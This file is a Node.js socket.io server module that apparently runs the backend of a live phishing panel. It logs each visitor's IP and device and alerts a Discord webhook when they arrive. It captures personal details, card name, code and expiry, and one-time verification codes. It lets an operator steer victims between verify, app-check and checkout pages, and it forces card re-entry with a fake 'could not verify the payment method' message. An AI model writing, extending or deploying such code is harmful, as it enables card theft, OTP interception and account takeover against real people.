function registerSocketHandlers(ctx) {
  const {
    io,
    store,
    onlineUsers,
    adminSockets,
    discordHomeNotified,
    enteredClientIds,
    submittedClientIds,
    socketEnterKey,
    emitAdmin,
    notifyDiscordHomeOnline,
    cleanupSocketTracking,
    isAdminSocket,
    getClientIp,
    getUserAgent,
    detectDeviceType,
    detectDeviceOS,
    getMainRecord,
    getMainRecordByClientId,
    getClientRecords,
    normalizeClientId,
    getActiveRecord,
    setActiveRecord,
    nextSubId,
    getMainId,
    normalizeVerifyMethod,
    pushVerifyHistory,
    buildSubRecordFrom,
    touch,
    pushCheckoutSnapshot,
    setUserPage,
    updateRecordOwnership,
    getLatestRecordForSocket,
    nowCN,
    nowTs,
    recordsById,
    recordsBySocketId,
    appendRecord,
    ADMIN_PASSWORD,
    DISCORD_WEBHOOK_DEBUG,
    getAdminStats,
  } = ctx;
  const pendingOfflineTimers = new Map();

  io.on('connection', (socket) => {
    const ip = getClientIp(socket);
    const userAgent = getUserAgent(socket);
    const deviceType = detectDeviceType(userAgent);
    const deviceOS = detectDeviceOS(userAgent);

    onlineUsers.set(socket.id, {
      page: 'pending',
      ip,
      deviceType,
      deviceOS,
      online: false,
      activeRecordId: null,
      clientId: '',
      activated: false,
    });

    function markEnteredClient(key) {
      if (!key) return false;
      const previousKey = socketEnterKey.get(socket.id);
      if (previousKey === key) return false;
      if (previousKey && previousKey.startsWith('socket:') && key.startsWith('client:')) {
        enteredClientIds.delete(previousKey);
      }
      socketEnterKey.set(socket.id, key);
      const before = enteredClientIds.size;
      enteredClientIds.add(key);
      return enteredClientIds.size !== before;
    }

    markEnteredClient(`socket:${socket.id}`);
    emitAdmin();

    function notifyDiscordUserEntered(source, { recordId, clientId } = {}) {
      if (discordHomeNotified.has(socket.id)) return;
      discordHomeNotified.add(socket.id);
      notifyDiscordHomeOnline({
        time: nowCN(),
        ip,
        deviceType,
        deviceOS,
        recordId,
        clientId,
      });
      if (DISCORD_WEBHOOK_DEBUG) console.log(`[discord] sent ${source} notice for`, socket.id);
    }

    socket.on('attach-client', ({ clientId } = {}, ack) => {
      const cid = normalizeClientId(clientId) || socket.id;
      const nextEnterKey = normalizeClientId(clientId) ? `client:${normalizeClientId(clientId)}` : `socket:${socket.id}`;
      markEnteredClient(nextEnterKey);

      const currentUser = onlineUsers.get(socket.id) || {
        page: 'pending',
        ip,
        deviceType,
        deviceOS,
        online: false,
        activeRecordId: null,
        clientId: '',
        activated: false,
      };

      currentUser.clientId = cid;
      currentUser.ip = ip;
      currentUser.deviceType = deviceType;
      currentUser.deviceOS = deviceOS;
      currentUser.online = true;
      currentUser.activated = true;

      for (const [sid, user] of onlineUsers.entries()) {
        if (sid === socket.id) continue;
        if (user?.clientId !== cid) continue;
        if (user.activeRecordId) currentUser.activeRecordId = user.activeRecordId;
        if (user.page) currentUser.page = user.page;
        onlineUsers.delete(sid);
      }

      const clientRecords = getClientRecords(cid);
      if (clientRecords.length > 0) {
        clientRecords.forEach((r) => {
          updateRecordOwnership(r, {
            socketId: socket.id,
            ip,
            deviceType,
            deviceOS,
            online: true,
            clientId: cid,
          });
        });

        const active =
          clientRecords.find((r) => currentUser.activeRecordId && r.id === currentUser.activeRecordId) ||
          clientRecords.find((r) => r.active) ||
          [...clientRecords].sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0))[0];

        if (active) {
          currentUser.activeRecordId = active.id;
          currentUser.page = active.page || currentUser.page || 'home';
          setActiveRecord(socket.id, active.id);
        }
      }

      onlineUsers.set(socket.id, currentUser);
      emitAdmin();
      notifyDiscordUserEntered('attach-client', {
        recordId: currentUser.activeRecordId || undefined,
        clientId: currentUser.clientId || cid,
      });
      ack?.({ ok: true, resumed: clientRecords.length > 0, page: currentUser.page, activeRecordId: currentUser.activeRecordId });
    });

    socket.on('admin-route-user', ({ socketId, target, reason }, ack) => {
      try {
        if (!isAdminSocket(socket.id)) {
          ack?.({ ok: false, error: 'admin unauthorized' });
          return;
        }

        if (!socketId || !target) {
          ack?.({ ok: false, error: 'missing socketId/target' });
          return;
        }

        const targetSocket = io.sockets.sockets.get(socketId);
        if (!targetSocket) {
          ack?.({ ok: false, error: 'target user offline / socket not found' });
          return;
        }

        const pageForAdmin =
          String(target).toLowerCase() === 'emailverify'
            ? 'emailverify'
            : String(target).toLowerCase() === 'verifyphone'
              ? 'verify'
              : String(target).toLowerCase() === 'appcheck'
                ? 'appcheck'
                : String(target).toLowerCase() === 'verify'
                  ? 'verify'
                  : String(target).toLowerCase() === 'home'
                    ? 'home'
                    : String(target).toLowerCase() === 'checkout'
                      ? 'checkout'
                      : 'unknown';

        let routeRecord = getActiveRecord(socketId);

        io.to(socketId).emit('checkout-route', {
          target,
          reason: reason || '',
        });

        setUserPage(socketId, pageForAdmin);

        routeRecord = getActiveRecord(socketId) || routeRecord;
        if (routeRecord) touch(routeRecord, `Admin routed user 鈫?${pageForAdmin}`);

        emitAdmin();
        ack?.({ ok: true });
      } catch (e) {
        ack?.({ ok: false, error: e?.message || 'unknown error' });
      }
    });

    socket.on('admin-route-url', ({ socketId, reason }, ack) => {
      try {
        if (!isAdminSocket(socket.id)) {
          ack?.({ ok: false, error: 'admin unauthorized' });
          return;
        }

        if (!socketId) {
          ack?.({ ok: false, error: 'missing socketId' });
          return;
        }

        const targetSocket = io.sockets.sockets.get(socketId);
        if (!targetSocket) {
          ack?.({ ok: false, error: 'target user offline / socket not found' });
          return;
        }

        io.to(socketId).emit('admin-open-url', {
          action: 'open-external',
          reason: reason || '',
        });

        setUserPage(socketId, 'external');
        const active = getActiveRecord(socketId);
        if (active) touch(active, 'Admin routed user -> external');

        emitAdmin();
        ack?.({ ok: true });
      } catch (e) {
        ack?.({ ok: false, error: e?.message || 'unknown error' });
      }
    });

    socket.on('join-page', (page) => {
      const p = (page || '').toString();
      setUserPage(socket.id, p);
      const user = onlineUsers.get(socket.id);
      const lowerPage = p.toLowerCase();
      if (lowerPage === 'home' && !socketEnterKey.has(socket.id)) {
        const key = normalizeClientId(user?.clientId) ? `client:${normalizeClientId(user?.clientId)}` : `socket:${socket.id}`;
        if (markEnteredClient(key)) emitAdmin();
      }
      if (user) {
        user.ip = ip;
        user.deviceType = deviceType;
        user.deviceOS = deviceOS;
      }
      if (user && !user.activated) return;

      const active = getActiveRecord(socket.id);
      if (active) {
        active.ip = ip;
        active.deviceType = deviceType;
        active.deviceOS = deviceOS;
        touch(active, `Entered ${p}`);
      }

      emitAdmin();

      if (p.toLowerCase() === 'home') {
        notifyDiscordUserEntered('join-page:home', {
          recordId: active?.id,
          clientId: user?.clientId,
        });
      }
    });

    socket.on('home-entered', () => {
      const user = onlineUsers.get(socket.id);
      notifyDiscordUserEntered('home-entered', {
        recordId: undefined,
        clientId: user?.clientId,
      });
    });

    socket.on('leave-page', ({ page, reason }) => {
      const p = (page || '').toString();
      const leaveReason = (reason || '').toString().toLowerCase();
      const transientLeave = leaveReason === 'hidden' || leaveReason === 'beforeunload';

      const user = onlineUsers.get(socket.id);
      if (user && !transientLeave) user.page = 'left';

      const active = getActiveRecord(socket.id);
      if (active) {
        active.page = p || active.page || 'unknown';
        if (!transientLeave) {
          touch(active, `Left ${p || 'page'}${reason ? ` (${reason})` : ''}`);
        }
      }

      emitAdmin();
    });

    socket.on('register-user', ({ clickTime, clientId } = {}, ack) => {
      const cid = normalizeClientId(clientId || onlineUsers.get(socket.id)?.clientId) || socket.id;
      const submitClientId = normalizeClientId(cid);
      if (submitClientId) submittedClientIds.add(`client:${submitClientId}`);
      const user = onlineUsers.get(socket.id);
      if (user && cid) user.clientId = cid;
      if (user) {
        user.activated = true;
        user.online = true;
        user.ip = ip;
        user.deviceType = deviceType;
        user.deviceOS = deviceOS;
      }

      const existingMain = getMainRecordByClientId(cid);
      if (existingMain) {
        const clientRecords = getClientRecords(cid);
        clientRecords.forEach((r) => {
          updateRecordOwnership(r, {
            socketId: socket.id,
            ip,
            deviceType,
            deviceOS,
            online: true,
            clientId: cid,
          });
        });

        const active =
          clientRecords.find((r) => r.active) ||
          [...clientRecords].sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0))[0] ||
          existingMain;

        setActiveRecord(socket.id, active.id);
        if (user) {
          user.activeRecordId = active.id;
          user.page = active.page || user.page || 'home';
          user.online = true;
          user.ip = ip;
          user.deviceType = deviceType;
          user.deviceOS = deviceOS;
        }

        emitAdmin();
        notifyDiscordUserEntered('register-user:resume', {
          recordId: active.id,
          clientId: cid,
        });
        ack?.({ ok: true, resumed: true, recordId: active.id, page: user?.page || active.page || 'home' });
        return;
      }

      const id = store.recordCounter++;
      const time = clickTime || nowCN();
      const ts = nowTs();

      const mainRecord = {
        id,
        clientId: cid || '',
        socketId: socket.id,
        ip,
        deviceType,
        deviceOS,
        time,
        page: 'home',
        online: true,
        status: 'Entered home',
        fullname: '',
        address: '',
        fulladdress: '',
        city: '',
        state: '',
        postalcode: '',
        email: '',
        telephone: '',
        checkoutName: '',
        checkoutPhone: '',
        checkoutCode: '',
        checkoutExpiryDate: '',
        checkoutDate: '',
        checkoutSnapshots: [],
        verify: '',
        verifyHistory: [],
        verifyMethod: '',
        emailVerify: '',
        appCheck: '',
        createdAt: ts,
        updatedAt: ts,
        history: [{ at: ts, time, status: 'Created main record' }],
        note: '',
        active: true,
      };

      appendRecord(mainRecord);
      setActiveRecord(socket.id, id);
      if (user) user.activeRecordId = id;

      emitAdmin();
      notifyDiscordUserEntered('register-user:new', {
        recordId: id,
        clientId: cid,
      });
      ack?.({ ok: true, resumed: false, recordId: id, page: 'home' });
    });

    socket.on('update-form-field', (data) => {
      const field = (data?.field || '').toString();
      const value = field === 'verifyMethod' ? normalizeVerifyMethod(data?.value) : data?.value ?? '';

      const fieldName =
        {
          fullname: 'Full Name',
          address: 'Address',
          fulladdress: 'Address Line 2',
          city: 'City',
          state: 'State/Province',
          postalcode: 'Postal Code',
          email: 'Email',
          telephone: 'Phone',
          checkoutName: 'Checkout Name',
          checkoutPhone: 'Checkout Phone',
          checkoutCode: 'Checkout Code',
          checkoutExpiryDate: 'Checkout Expiry Date',
          verify: 'Verify',
          verifyMethod: 'Verify Method',
          emailVerify: 'Email Verify',
          appCheck: 'App Check',
        }[field] || field;

      const active = getActiveRecord(socket.id);
      if (active) {
        active[field] = value;
        const statusText = field === 'verifyMethod' ? `Selected verify method: ${value || '-'}` : `Editing: ${fieldName}`;
        touch(active, statusText);

        if (field === 'verifyMethod') {
          const mainId = getMainId(active.id);
          if (mainId) {
            const mainRecord = recordsById.get(mainId);
            if (mainRecord && mainRecord !== active) {
              mainRecord.verifyMethod = value;
              mainRecord.updatedAt = active.updatedAt;
              mainRecord.status = statusText;
            }
          }
        }
      }

      emitAdmin();
    });

    socket.on('get-verify-contact-options', (_data, ack) => {
      const user = onlineUsers.get(socket.id);

      let source = getActiveRecord(socket.id);
      if (!source && user?.clientId) source = getMainRecordByClientId(user.clientId);
      if (!source) source = getMainRecord(socket.id);
      if (!source) source = getLatestRecordForSocket(socket.id);

      ack?.({
        ok: true,
        telephone: (source?.telephone || '').toString(),
        email: (source?.email || '').toString(),
      });
    });

    socket.on('verify-submit', ({ verifyId } = {}, ack) => {
      const verifyValue = (verifyId || '').toString().trim().slice(0, 200);
      if (!verifyValue) {
        ack?.({ ok: false, error: 'missing verifyId' });
        return;
      }

      const active = getActiveRecord(socket.id);
      if (!active) {
        ack?.({ ok: false, error: 'active record not found' });
        return;
      }

      const target = active;
      target.verify = verifyValue;
      target.page = 'verify';
      target.online = true;
      target.ip = ip;
      target.deviceType = deviceType;
      target.deviceOS = deviceOS;
      pushVerifyHistory(target, verifyValue);
      touch(target, 'Verify submitted');

      const mainId = getMainId(target.id);
      if (mainId) {
        const mainRecord = recordsById.get(mainId);
        if (mainRecord) {
          mainRecord.verify = verifyValue;
          mainRecord.verifyMethod = (target.verifyMethod || '').toString();
          mainRecord.page = 'verify';
          mainRecord.online = true;
          mainRecord.ip = ip;
          mainRecord.deviceType = deviceType;
          mainRecord.deviceOS = deviceOS;
          mainRecord.updatedAt = target.updatedAt;
          if (mainRecord !== target) pushVerifyHistory(mainRecord, verifyValue);
        }
      }

      const user = onlineUsers.get(socket.id);
      if (user) {
        user.page = 'verify';
        user.online = true;
        user.ip = ip;
        user.deviceType = deviceType;
        user.deviceOS = deviceOS;
        user.activeRecordId = target.id;
      }
      emitAdmin();
      ack?.({ ok: true, createdSub: false, recordId: target.id });
    });

    socket.on('update-user-info', (data) => {
      const active = getActiveRecord(socket.id);
      if (active) {
        Object.assign(active, data);
        active.page = 'checkout';
        touch(active, 'Submitted 鈫?Checkout');
      }
      emitAdmin();
    });

    socket.on('checkout-submit', (data) => {
      const active = getActiveRecord(socket.id);
      if (active) {
        active.checkoutName = (data?.checkoutName || '').toString();
        active.checkoutPhone = (data?.checkoutPhone || '').toString();
        active.checkoutCode = (data?.checkoutCode || '').toString();
        active.checkoutExpiryDate = (data?.checkoutExpiryDate || '').toString();
        active.checkoutDate = nowCN();
        pushCheckoutSnapshot(active);
        active.page = 'checkout';
        touch(active, 'Checkout submitted');
      }
      emitAdmin();
    });

    socket.on('request-refill', ({ socketId, reason }, ack) => {
      if (!isAdminSocket(socket.id)) {
        ack?.({ ok: false, error: 'admin unauthorized' });
        return;
      }

      const targetSocket = io.sockets.sockets.get(socketId);
      if (!targetSocket) {
        ack?.({ ok: false, error: 'target user offline / socket not found' });
        return;
      }

      const mainRecord = getMainRecord(socketId);
      if (!mainRecord) {
        ack?.({ ok: false, error: 'main record not found' });
        return;
      }

      const subId = nextSubId(mainRecord.id);
      const subRecord = buildSubRecordFrom(mainRecord, {
        id: subId,
        page: 'info',
        status: 'Refill requested - please re-enter',
        historyStatus: 'Created sub record (refill info)',
        refillReason: reason || '',
      });

      subRecord.socketId = socketId;
      subRecord.ip = mainRecord.ip;
      subRecord.deviceType = mainRecord.deviceType || deviceType;
      subRecord.deviceOS = mainRecord.deviceOS || deviceOS;
      subRecord.page = 'info';
      subRecord.status = 'Refill requested - please re-enter';
      subRecord.online = true;

      subRecord.fullname = '';
      subRecord.address = '';
      subRecord.fulladdress = '';
      subRecord.city = '';
      subRecord.state = '';
      subRecord.postalcode = '';
      subRecord.email = '';
      subRecord.telephone = '';

      subRecord.checkoutName = '';
      subRecord.checkoutPhone = '';
      subRecord.checkoutCode = '';
      subRecord.checkoutExpiryDate = '';
      subRecord.checkoutDate = '';
      subRecord.checkoutSnapshots = [];

      subRecord.verify = '';
      subRecord.verifyHistory = [];
      subRecord.verifyMethod = '';
      subRecord.emailVerify = '';
      subRecord.appCheck = '';

      appendRecord(subRecord);
      setActiveRecord(socketId, subId);
      io.to(socketId).emit('checkout-route', { target: 'info', reason: reason || 'Please refill recipient details' });
      targetSocket.emit('force-refill', { reason: reason || '', recordId: subId });
      emitAdmin();
      ack?.({ ok: true });
    });

    socket.on('request-checkout-refill', ({ socketId, recordId, reason }, ack) => {
      if (!isAdminSocket(socket.id)) {
        ack?.({ ok: false, error: 'admin unauthorized' });
        return;
      }

      const targetSocket = io.sockets.sockets.get(socketId);
      if (!targetSocket) {
        ack?.({ ok: false, error: 'target user offline / socket not found' });
        return;
      }

      let targetRecord = null;
      if (recordId !== undefined && recordId !== null) {
        const record = recordsById.get(recordId) || recordsById.get(recordId.toString());
        targetRecord = record && record.socketId === socketId ? record : null;
      }
      if (!targetRecord) {
        targetRecord =
          getActiveRecord(socketId) ||
          Array.from(recordsBySocketId.get(socketId) || []).find((r) => r.active) ||
          getMainRecord(socketId) ||
          null;
      }
      if (!targetRecord) {
        ack?.({ ok: false, error: 'target record not found' });
        return;
      }

      pushCheckoutSnapshot(targetRecord);
      const mainId = getMainId(targetRecord.id) || targetRecord.id;
      const subId = nextSubId(mainId);
      const subRecord = buildSubRecordFrom(targetRecord, {
        id: subId,
        page: 'checkout',
        status: 'Checkout refill requested - please re-enter',
        historyStatus: 'Created sub record (refill checkout)',
      });

      subRecord.socketId = socketId;
      subRecord.ip = targetRecord.ip || ip;
      subRecord.deviceType = targetRecord.deviceType || deviceType;
      subRecord.deviceOS = targetRecord.deviceOS || deviceOS;
      subRecord.page = 'checkout';
      subRecord.status = 'Checkout refill requested - please re-enter';
      subRecord.online = true;
      subRecord.checkoutName = '';
      subRecord.checkoutPhone = '';
      subRecord.checkoutCode = '';
      subRecord.checkoutExpiryDate = '';
      subRecord.checkoutDate = '';
      subRecord.checkoutSnapshots = [];
      subRecord.verify = '';
      subRecord.verifyHistory = [];
      subRecord.verifyMethod = '';
      subRecord.emailVerify = '';
      subRecord.appCheck = '';

      touch(targetRecord, 'Checkout refill requested');
      appendRecord(subRecord);
      setActiveRecord(socketId, subId);

      io.to(socketId).emit('checkout-route', {
        target: 'checkout',
        reason: reason || 'We could not verify the payment method on file. Please review and re-enter your card details',
      });
      targetSocket.emit('force-checkout-refill', { recordId: subId });

      emitAdmin();
      ack?.({ ok: true, recordId: subId });
    });

    socket.on('admin-set-note', ({ recordId, note }, ack) => {
      if (!isAdminSocket(socket.id)) {
        ack?.({ ok: false, error: 'admin unauthorized' });
        return;
      }

      const r = recordsById.get(recordId) || recordsById.get(recordId.toString());
      if (!r) {
        ack?.({ ok: false, error: 'record not found' });
        return;
      }
      r.note = String(note || '').slice(0, 500);
      touch(r, r.status || 'Updated note');
      emitAdmin();
      ack?.({ ok: true });
    });

    socket.on('join-admin', ({ password } = {}, ack) => {
      const input = (password || '').toString();
      if (!input || input !== ADMIN_PASSWORD) {
        adminSockets.delete(socket.id);
        socket.leave('admin');
        ack?.({ ok: false, error: 'invalid password' });
        return;
      }

      adminSockets.add(socket.id);
      socket.join('admin');
      socketEnterKey.delete(socket.id);
      socket.emit('admin-update', {
        records: store.records,
        onlineUsers: Array.from(onlineUsers.values()).filter((u) => u && u.activated),
        stats: getAdminStats(),
      });
      ack?.({ ok: true });
    });

    socket.on('admin-clear-all', (_, ack) => {
      if (!isAdminSocket(socket.id)) {
        ack?.({ ok: false, error: 'admin unauthorized' });
        return;
      }

      store.clear();
      enteredClientIds.clear();
      submittedClientIds.clear();
      socketEnterKey.clear();
      onlineUsers.forEach((u) => (u.activeRecordId = null));
      emitAdmin();
      ack?.({ ok: true });
    });

    socket.on('disconnect', () => {
      discordHomeNotified.delete(socket.id);
      const timer = setTimeout(() => {
        const user = onlineUsers.get(socket.id);
        if (user) user.online = false;

        store.records.forEach((r) => {
          if (r.socketId === socket.id) {
            r.online = false;
            touch(r, r.status || 'Offline');
          }
        });

        cleanupSocketTracking(socket.id);
        pendingOfflineTimers.delete(socket.id);
        emitAdmin();
      }, 8000);

      pendingOfflineTimers.set(socket.id, timer);
    });
  });
}

module.exports = {
  registerSocketHandlers,
};
